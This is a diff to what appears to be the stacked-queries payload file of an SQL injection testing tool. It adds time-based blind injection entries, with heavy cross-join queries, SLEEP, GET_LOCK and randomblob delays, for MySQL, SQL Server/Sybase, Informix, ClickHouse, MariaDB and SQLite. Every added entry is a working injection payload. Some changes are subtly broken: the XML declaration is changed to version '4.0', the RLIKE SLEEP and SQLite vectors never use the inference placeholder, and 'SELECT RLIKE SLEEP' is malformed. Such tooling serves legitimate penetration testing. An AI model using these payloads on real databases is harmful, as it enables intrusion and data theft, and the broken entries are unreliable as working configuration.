@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="UTF-8"?>
+<?xml version="4.0" encoding="UTF-8"?>
 
 <root>
     <!-- Stacked queries tests -->
@@ -120,6 +120,47 @@
         </response>
         <details>
             <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt; 5.0.12 stacked queries (heavy query - comment)</title>
+        <stype>4</stype>
+        <level>4</level>
+        <risk>2</risk>
+        <clause>1-8</clause>
+        <where>1</where>
+        <vector>;SELECT IF(([INFERENCE]),(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C),[RANDNUM])</vector>
+        <request>
+            <payload>;SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C</payload>
+            <comment>#</comment>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt; 5.0.12</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt; 5.0.12 stacked queries (heavy query)</title>
+        <stype>4</stype>
+        <level>5</level>
+        <risk>2</risk>
+        <clause>1-8</clause>
+        <where>1</where>
+        <vector>;SELECT IF(([INFERENCE]),(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C),[RANDNUM])</vector>
+        <request>
+            <payload>;SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt; 5.0.12</dbms_version>
         </details>
     </test>
 
@@ -321,6 +362,47 @@
         </request>
         <response>
             <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+            <dbms>Sybase</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Microsoft SQL Server/Sybase stacked queries (heavy query - comment)</title>
+        <stype>4</stype>
+        <level>3</level>
+        <risk>2</risk>
+        <clause>1-8</clause>
+        <where>1</where>
+        <vector>;IF([INFERENCE]) SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7</vector>
+        <request>
+            <payload>;SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+            <dbms>Sybase</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Microsoft SQL Server/Sybase stacked queries (heavy query)</title>
+        <stype>4</stype>
+        <level>5</level>
+        <risk>2</risk>
+        <clause>1-8</clause>
+        <where>1</where>
+        <vector>;IF([INFERENCE]) SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7</vector>
+        <request>
+            <payload>;SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
         </response>
         <details>
             <dbms>Microsoft SQL Server</dbms>
@@ -725,6 +807,206 @@
             <dbms_version>&gt;= 2.0</dbms_version>
         </details>
     </test>
-    <!-- TODO: if possible, add payload for Microsoft Access -->
+
+    <test>
+        <title>Informix stacked queries (heavy query - comment)</title>
+        <stype>4</stype>
+        <level>3</level>
+        <risk>2</risk>
+        <clause>1-8</clause>
+        <where>1</where>
+        <vector>;SELECT CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) ELSE [RANDNUM] END FROM systables WHERE tabid=1</vector>
+        <request>
+            <payload>;SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>Informix</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Informix stacked queries (heavy query)</title>
+        <stype>4</stype>
+        <level>5</level>
+        <risk>2</risk>
+        <clause>1-8</clause>
+        <where>1</where>
+        <vector>;SELECT CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) ELSE [RANDNUM] END FROM systables WHERE tabid=1</vector>
+        <request>
+            <payload>;SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>Informix</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>ClickHouse stacked queries (heavy query - comment)</title>
+        <stype>4</stype>
+        <level>4</level>
+        <risk>2</risk>
+        <clause>1-8</clause>
+        <where>1</where>
+        <vector>;SELECT COUNT(fuzzBits('[RANDSTR]', 0.001)) FROM numbers(if(([INFERENCE]), 1000000, 1))</vector>
+        <request>
+            <payload>;SELECT COUNT(fuzzBits('[RANDSTR]', 0.001)) FROM numbers(1000000)</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>ClickHouse</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>ClickHouse stacked queries (heavy query)</title>
+        <stype>4</stype>
+        <level>5</level>
+        <risk>2</risk>
+        <clause>1-8</clause>
+        <where>1</where>
+        <vector>;SELECT COUNT(fuzzBits('[RANDSTR]', 0.001)) FROM numbers(if(([INFERENCE]), 1000000, 1))</vector>
+        <request>
+            <payload>;SELECT COUNT(fuzzBits('[RANDSTR]', 0.001)) FROM numbers(1000000)</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>ClickHouse</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>MariaDB stacked queries (comment)</title>
+        <stype>4</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>1-8</clause>
+        <where>1</where>
+        <vector>;SELECT IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])</vector>
+        <request>
+            <payload>;SELECT SLEEP([SLEEPTIME])</payload>
+            <comment>#</comment>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MariaDB</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>MariaDB stacked queries</title>
+        <stype>4</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1-8</clause>
+        <where>1</where>
+        <vector>;SELECT IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])</vector>
+        <request>
+            <payload>;SELECT SLEEP([SLEEPTIME])</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MariaDB</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL/MariaDB stacked queries (GET_LOCK)</title>
+        <stype>4</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>1-8</clause>
+        <where>1</where>
+        <vector>;SELECT IF(([INFERENCE]),GET_LOCK('[RANDSTR]',[SLEEPTIME]),[RANDNUM])</vector>
+        <request>
+            <payload>;SELECT GET_LOCK('[RANDSTR]',[SLEEPTIME])</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms>MariaDB</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL/MariaDB stacked queries (RLIKE SLEEP - comment)</title>
+        <stype>4</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1-8</clause>
+        <where>1</where>
+        <vector>;SELECT RLIKE SLEEP([SLEEPTIME])</vector>
+        <request>
+            <payload>;SELECT RLIKE SLEEP([SLEEPTIME])</payload>
+            <comment>#</comment>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms>MariaDB</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>SQLite stacked queries (randomblob delay - comment)</title>
+        <stype>4</stype>
+        <level>4</level>
+        <risk>2</risk>
+        <clause>1-8</clause>
+        <where>1</where>
+        <vector>;SELECT hex(randomblob([SLEEPTIME]000000))</vector>
+        <request>
+            <payload>;SELECT hex(randomblob([SLEEPTIME]000000))</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>SQLite</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>SQLite stacked queries (randomblob delay)</title>
+        <stype>4</stype>
+        <level>5</level>
+        <risk>2</risk>
+        <clause>1-8</clause>
+        <where>1</where>
+        <vector>;SELECT hex(randomblob([SLEEPTIME]000000))</vector>
+        <request>
+            <payload>;SELECT hex(randomblob([SLEEPTIME]000000))</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>SQLite</dbms>
+        </details>
+    </test>
+
+    <!-- TODO: Add payload for Microsoft Access if possible -->
+    <!-- Note: Microsoft Access/Jet doesn't support stacked queries traditionally, but could use UNION-based or other techniques -->
+    
     <!-- End of stacked queries tests -->
 </root>
